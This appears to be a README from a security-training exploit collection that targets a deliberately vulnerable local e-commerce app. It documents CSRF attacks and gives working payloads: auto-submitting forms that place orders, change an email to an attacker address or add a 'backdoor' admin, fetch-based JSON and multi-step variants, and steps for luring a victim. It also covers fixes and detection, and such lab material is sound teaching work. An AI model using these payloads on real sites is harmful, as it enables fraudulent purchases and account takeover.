# EcomStore CSRF Exploits

## Overview
This directory contains Cross-Site Request Forgery (CSRF) exploits for the EcomStore application. EcomStore lacks CSRF protection on order placement and account modification endpoints.

## Target Application
- **App**: EcomStore
- **Port**: 5004
- **Vulnerability**: CSRF on order/account endpoints
- **Severity**: MEDIUM-HIGH

## Available Exploits

### 1. order_csrf.html
**Type**: CSRF Attack via HTML page  
**Target Endpoints**:
- `/order` (POST) - Place orders
- `/account/update` (POST) - Modify account
- `/cart/checkout` (POST) - Complete checkout

## How It Works

**Attack Flow**:
1. Victim is logged into EcomStore
2. Victim visits attacker's page with CSRF exploit
3. Browser automatically sends authenticated request
4. Order is placed using victim'saccount

**Why It Works**:
- No CSRF token validation
- Accepts cross-origin requests
- Relies only on session cookie
- No SameSite cookie attribute

## Usage

### Method 1: Standalone HTML Page
```bash
# 1. Ensure victim is logged into EcomStore (localhost:5004)
firefox http://localhost:5004

# 2. Open the CSRF exploit page
firefox order_csrf.html

# 3. Form auto-submits, placing order as victim
```

### Method 2: Host on Attacker Server
```bash
# Start simple HTTP server
python3 -m http.server 8000

# Send link to victim
# http://attacker-server:8000/order_csrf.html

# When victim clicks, CSRF executes
```

### Method 3: Embedded in Email/Website
```html
<!-- Hidden in legitimate-looking page -->
<img src="data:text/html,<form method='POST' action='http://localhost:5004/order'><input name='item_id' value='123'><input name='quantity' value='999'></form><script>document.forms[0].submit()</script>">
```

## Exploit Customization

Edit `order_csrf.html` to change attack parameters:

```html
<form action="http://localhost:5004/order" method="POST" id="csrf-form">
  <!-- Modify these values -->
  <input type="hidden" name="item_id" value="expensive_item_123">
  <input type="hidden" name="quantity" value="10">
  <input type="hidden" name="shipping" value="attacker_address">
</form>
```

## Testing Steps

1. **Start EcomStore**:
```bash
cd ../../projects/ecomstore
docker-compose up -d
```

2. **Login as Victim**:
```bash
# Browse to EcomStore
firefox http://localhost:5004

# Login with test credentials
# user: testuser
# pass: testpass
```

3. **Execute CSRF Attack**:
```bash
# Open exploit page
firefox order_csrf.html

# Check if order was placed
curl -b cookies.txt http://localhost:5004/orders
```

4. **Verify Impact**:
- Check victim's order history
- Verify unauthorized order appeared
- Check victim's session remained valid

## Attack Variations

### Variation 1: Account Takeover
```html
<form action="http://localhost:5004/account/email" method="POST">
  <input name="new_email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

### Variation 2: Add Admin User
```html
<form action="http://localhost:5004/admin/users" method="POST">
  <input name="username" value="backdoor">
  <input name="role" value="admin">
</form>
<script>document.forms[0].submit()</script>
```

### Variation 3: Mass Purchase
```html
<form action="http://localhost:5004/cart/bulk" method="POST">
  <input name="items" value="all">
  <input name="quantity" value="maximum">
</form>
<script>document.forms[0].submit()</script>
```

## Defense Analysis

**Why EcomStore is Vulnerable**:
```python
@app.route('/order', methods=['POST'])
def place_order():
    # NO CSRF token validation!
    item_id = request.form.get('item_id')
    user_id = session['user_id']
    
    # Order is placed without verifying request origin
    create_order(user_id, item_id)
    return "Order placed"
```

**How to Fix**:
```python
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
csrf = CSRFProtect(app)

@app.route('/order', methods=['POST'])
def place_order():
    # CSRF token automatically validated by decorator
    item_id = request.form.get('item_id')
    user_id = session['user_id']
    create_order(user_id, item_id)
    return "Order placed"
```

## Detection Methods

**Manual Testing**:
1. Login to application
2. Capture legitimate POST request (Burp Suite)
3. Remove/modify any CSRF tokens
4. Replay request from different origin
5. If succeeds = CSRF vulnerable

**Automated Testing**:
```bash
# Using OWASP ZAP
zap-cli quick-scan -s all http://localhost:5004

# Using Burp Suite
# 1. Enable CSRF scanner
# 2. Browse application while logged in
# 3. Check for CSRF issues in scan results
```

## Real-World Impact

**Financial Loss**:
- Unauthorized purchases
- Drained accounts
- Fraudulent orders

**Account Compromise**:
- Password changes
- Email modifications
- Account lockout

**Privilege Escalation**:
- Adding admin users
- Modifying permissions
- Backdoor creation

## Advanced Techniques

### GET-based CSRF
```html
<!-- If endpoint mistakenly accepts GET -->
<img src="http://localhost:5004/order?item_id=123&qty=10">
```

### JSON CSRF
```html
<script>
fetch('http://localhost:5004/api/order', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({item_id: 123, quantity: 10})
});
</script>
```

### Multi-Step CSRF
```html
<script>
// Step 1: Get product ID
fetch('http://localhost:5004/products/expensive')
  .then(r => r.json())
  .then(data => {
    // Step 2: Add to cart
    fetch('http://localhost:5004/cart/add', {
      method: 'POST',
      credentials: 'include',
      body: 'item_id=' + data.id
    });
  });
</script>
```

## Notes
**WARNING**: CSRF can lead to:
- Unauthorized transactions
- Account modifications
- Data theft
- Privilege escalation

**Best Practices**:
- Always use CSRF tokens
- Set SameSite=Strict on session cookies
- Verify Origin/Referer headers
- Use POST for state-changing operations
- Implement re-authentication for sensitive actions

## Related Exploits
- See `../../dsvpwa/csrf/` for comprehensive CSRF techniques
- See `../../vulnblog/csrf/` for blog-specific CSRF
- See `../../python-vulnerableapp/csrf/` for CSRF on modern frameworks

## References
- OWASP CSRF Guide: https://owasp.org/www-community/attacks/csrf
- SameSite Cookies: https://web.dev/samesite-cookies-explained/
- CSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
